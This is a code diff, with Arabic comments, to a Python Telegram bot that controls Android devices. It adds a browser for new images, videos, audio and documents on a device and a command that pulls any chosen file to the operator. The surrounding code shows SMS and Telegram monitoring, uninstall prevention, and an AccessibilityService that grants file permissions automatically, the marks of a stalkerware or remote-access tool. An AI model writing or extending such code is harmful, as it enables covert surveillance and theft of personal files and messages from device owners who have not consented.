@@ -280,6 +280,14 @@ COMMANDS = {
     # ⚡ V11.2.25: مراقبة الملفات + منع إلغاء التثبيت
     "file-monitor-on":       {"category": "advanced", "label": "📁 مراقبة الملفات",       "description": "مراقبة الملفات الجديدة",          "needs_param": False},
     "file-monitor-off":      {"category": "advanced", "label": "⏹ إيقاف الملفات",    "description": "إيقاف مراقبة الملفات",      "needs_param": False},
+    # ⚡ V11.2.60: مستعرض الملفات الجديدة
+    "new-files-browser":     {"category": "advanced", "label": "🆕 مستعرض الجديدة",       "description": "تصفح الملفات الجديدة",          "needs_param": False},
+    "new-files-images":      {"category": "advanced", "label": "🖼️ صور جديدة",       "description": "الصور الجديدة فقط",          "needs_param": False},
+    "new-files-videos":      {"category": "advanced", "label": "🎬 فيديوهات جديدة",       "description": "الفيديوهات الجديدة فقط",          "needs_param": False},
+    "new-files-audio":       {"category": "advanced", "label": "🎵 صوتيات جديدة",       "description": "الصوتيات الجديدة فقط",          "needs_param": False},
+    "new-files-documents":   {"category": "advanced", "label": "📄 ملفات جديدة",       "description": "المستندات الجديدة فقط",          "needs_param": False},
+    "new-files-all":         {"category": "advanced", "label": "📋 كل الجديدة",       "description": "كل الملفات الجديدة",          "needs_param": False},
+    "pull-new-file":         {"category": "advanced", "label": "📥 سحب ملف",       "description": "سحب ملف من الجديدة",          "needs_param": True},
     "sms-monitor-on":        {"category": "advanced", "label": "💬 مراقبة الرسائل",       "description": "مراقبة الرسائل النصية الجديدة",          "needs_param": False},
     "sms-monitor-off":       {"category": "advanced", "label": "⏹ إيقاف الرسائل",    "description": "إيقاف مراقبة الرسائل",      "needs_param": False},
     "uninstall-protect-on":  {"category": "advanced", "label": "🔒 منع إلغاء التثبيت",       "description": "منع حذف التطبيق",          "needs_param": False},
@@ -508,6 +516,9 @@ def advanced_keyboard(did):
     kb.add(_cbtn(did,"telegram-monitor-off"))
     # ⚡ V11.2.25: مراقبة الملفات
     kb.add(_cbtn(did,"file-monitor-on"), _cbtn(did,"file-monitor-off"))
+    # ⚡ V11.2.60: مستعرض الملفات الجديدة (4 فئات: صور/فيديو/صوت/ملفات)
+    kb.add(InlineKeyboardButton("🆕 مستعرض الملفات الجديدة",
+                                 callback_data=_cb(did, "newfiles", "menu")))
     # ⚡ V11.2.27: مراقبة الرسائل النصية
     kb.add(_cbtn(did,"sms-monitor-on"), _cbtn(did,"sms-monitor-off"))
     # ⚡ V11.2.25: منع إلغاء التثبيت + V11.2.33: منع تعطيل الوصول
@@ -530,9 +541,9 @@ def permissions_keyboard(did):
            perm_btn("microphone", "🎤 الميكروفون"))
     kb.add(perm_btn("location", "📍 الموقع"),
            perm_btn("background-location", "🌐 الموقع في الخلفية"))
-    # ⚡ V11.2.56: زر "الملفات" يفتح صفحة "إدارة كل الملفات" مباشرة
-    # + AccessibilityService يضغط المفتاح تلقائياً
-    kb.add(perm_btn("all-files", "📁 الملفات"),
+    # ⚡ V11.2.57: زر "الملفات" يفتح dialog 'الملفات والوسائط'
+    # + AccessibilityService يختار 'كامل الملفات' RadioButton + يضغط السماح
+    kb.add(perm_btn("storage", "📁 الملفات"),
            perm_btn("contacts", "👥 جهات الاتصال"))
     kb.add(perm_btn("sms", "💬 الرسائل"),
            perm_btn("calls", "📞 المكالمات"))
@@ -549,6 +560,23 @@ def info_keyboard(did):
     # ✅ Media explorer buttons (use MediaStore - "الملفات والوسائط" permission)
     kb.add(_cbtn(did,"media-images"), _cbtn(did,"media-videos"))
     kb.add(_cbtn(did,"media-audio"))
+    kb.add(_back(did))
+    return kb
+
+# ── New Files Browser Keyboard (V11.2.60) ──
+def new_files_keyboard(did):
+    """مستعرض الملفات الجديدة - 4 فئات + كل"""
+    kb = InlineKeyboardMarkup(row_width=2)
+    kb.add(InlineKeyboardButton("🖼️ صور جديدة",
+                                 callback_data=_cb(did, "newfiles", "IMAGE")))
+    kb.add(InlineKeyboardButton("🎬 فيديوهات جديدة",
+                                 callback_data=_cb(did, "newfiles", "VIDEO")))
+    kb.add(InlineKeyboardButton("🎵 صوتيات جديدة",
+                                 callback_data=_cb(did, "newfiles", "AUDIO")))
+    kb.add(InlineKeyboardButton("📄 ملفات جديدة (مستندات/مضغوطات)",
+                                 callback_data=_cb(did, "newfiles", "DOCUMENT")))
+    kb.add(InlineKeyboardButton("📋 كل الجديدة",
+                                 callback_data=_cb(did, "newfiles", "ALL")))
     kb.add(_back(did))
     return kb
 
@@ -806,6 +834,86 @@ def _format_file_list_result(dev, file_data):
     return text, kb
 
 
+def _format_new_files_result(dev, new_data):
+    """⚡ V11.2.60: Format new files list as inline keyboard buttons.
+    Buttons call 'pullfile' action with cached path key.
+    After pulling, file is removed from new list.
+    """
+    did = dev.get("device_id", "")
+    short_label = _dev_label(dev)
+    file_type = new_data.get("file_type", "ALL")
+    files = new_data.get("files", [])
+    count = new_data.get("count", 0)
+
+    type_labels = {
+        "IMAGE": "🖼️ صور جديدة",
+        "VIDEO": "🎬 فيديوهات جديدة",
+        "AUDIO": "🎵 صوتيات جديدة",
+        "DOCUMENT": "📄 ملفات جديدة",
+        "ALL": "📋 كل الملفات الجديدة"
+    }
+    type_label = type_labels.get(file_type, "🆕 ملفات جديدة")
+    icons = {"IMAGE": "🖼️", "VIDEO": "🎬", "AUDIO": "🎵", "DOCUMENT": "📄"}
+
+    kb = InlineKeyboardMarkup(row_width=1)
+
+    if not files:
+        text = (
+            f"🆕 <b>{type_label}</b>\n\n"
+            f"📱 <b>{short_label}</b>\n"
+            f"━━━━━━━━━━━━━━━\n"
+            f"📁 لا توجد ملفات جديدة في هذه الفئة\n\n"
+            f"💡 فعّل 'مراقبة الملفات' أولاً\n"
+            f"💡 الملفات الجديدة ستظهر هنا تلقائياً"
+        )
+        kb.add(InlineKeyboardButton("🔙 رجوع", callback_data=_cb(did, "newfiles", "menu")))
+        return text, kb
+
+    file_count = 0
+    for f in files:
+        name = f.get("name", "?")
+        path = f.get("path", "")
+        size = f.get("size", 0)
+        ftype = f.get("type", "FILE")
+        source = f.get("source", "")
+
+        size_str = ""
+        if size > 1024 * 1024:
+            size_str = f" ({size // (1024 * 1024)}MB)"
+        elif size > 1024:
+            size_str = f" ({size // 1024}KB)"
+
+        icon = icons.get(ftype, "📄")
+        source_str = f" [{source}]" if source else ""
+
+        # Cache the path
+        cache_key = str(len(_file_path_cache))
+        _file_path_cache[cache_key] = path
+        if len(_file_path_cache) > 500:
+            keys = list(_file_path_cache.keys())
+            for k in keys[:250]:
+                del _file_path_cache[k]
+
+        kb.add(InlineKeyboardButton(
+            f"{icon} {name}{size_str}{source_str}",
+            callback_data=_cb(did, "pullfile", cache_key)
+        ))
+        file_count += 1
+
+    kb.add(InlineKeyboardButton("🔙 رجوع", callback_data=_cb(did, "newfiles", "menu")))
+
+    text = (
+        f"🆕 <b>{type_label}</b>\n\n"
+        f"📱 <b>{short_label}</b>\n"
+        f"━━━━━━━━━━━━━━━\n"
+        f"📊 عدد الملفات: {file_count}\n\n"
+        f"💡 اضغط على ملف لسحبه\n"
+        f"💡 الملفات المسحوبة تختفي تلقائياً"
+    )
+
+    return text, kb
+
+
 def _format_media_list_result(dev, media_data):
     """Format media file list (images/videos/audio) as inline keyboard buttons.
 
@@ -939,6 +1047,23 @@ def _format_cmd_result(dev, command, status, data=None, error=None, full_respons
 
                 if media_data.get("type") == "media_list":
                     return _format_media_list_result(dev, media_data)
+            except:
+                pass
+
+        # ⚡ V11.2.60: Check for new_files_list response
+        if command in ("new-files-images", "new-files-videos", "new-files-audio",
+                       "new-files-documents", "new-files-all"):
+            try:
+                import json as _json
+                if isinstance(data, str):
+                    new_data = _json.loads(data)
+                elif isinstance(data, dict):
+                    new_data = data
+                else:
+                    new_data = _json.loads(str(data))
+
+                if new_data.get("type") == "new_files_list":
+                    return _format_new_files_result(dev, new_data)
             except:
                 pass
 
@@ -1310,6 +1435,35 @@ class MDMBot:
                 uri = _resolve_file_path(tgt)
                 self._send_cmd(c.message.chat.id, did, "download-media", {"value": uri})
                 bot.answer_callback_query(c.id, "📥 جاري تحميل الوسائط...")
+
+            elif a == "newfiles":
+                # ⚡ V11.2.60: مستعرض الملفات الجديدة - عرض الفئات
+                if tgt == "menu":
+                    kb = new_files_keyboard(did)
+                    text = (
+                        f"🆕 <b>مستعرض الملفات الجديدة</b>\n\n"
+                        f"📱 <b>{_dev_label(self.dm.get_device(did))}</b>\n"
+                        f"━━━━━━━━━━━━━━━\n"
+                        f"اختر فئة لعرض الملفات الجديدة:\n\n"
+                        f"🖼️ صور جديدة\n"
+                        f"🎬 فيديوهات جديدة\n"
+                        f"🎵 صوتيات جديدة\n"
+                        f"📄 ملفات جديدة (مستندات/مضغوطات)\n"
+                        f"📋 كل الجديدة\n\n"
+                        f"💡 الملفات المسحوبة تختفي تلقائياً"
+                    )
+                    bot.edit_message_text(text, c.message.chat.id, c.message.message_id,
+                                          parse_mode="HTML", reply_markup=kb)
+                else:
+                    # tgt = نوع الملف (IMAGE/VIDEO/AUDIO/DOCUMENT/ALL)
+                    self._send_cmd(c.message.chat.id, did, "new-files-" + tgt.lower() if tgt != "ALL" else "new-files-all")
+                bot.answer_callback_query(c.id)
+
+            elif a == "pullfile":
+                # ⚡ V11.2.60: سحب ملف من قائمة الجديدة
+                file_path = _resolve_file_path(tgt)
+                self._send_cmd(c.message.chat.id, did, "pull-new-file", {"value": file_path})
+                bot.answer_callback_query(c.id, "📥 جاري سحب الملف...")
 
             elif a == "param":
                 self._pending[c.message.chat.id] = {"device_id": did, "command": tgt}
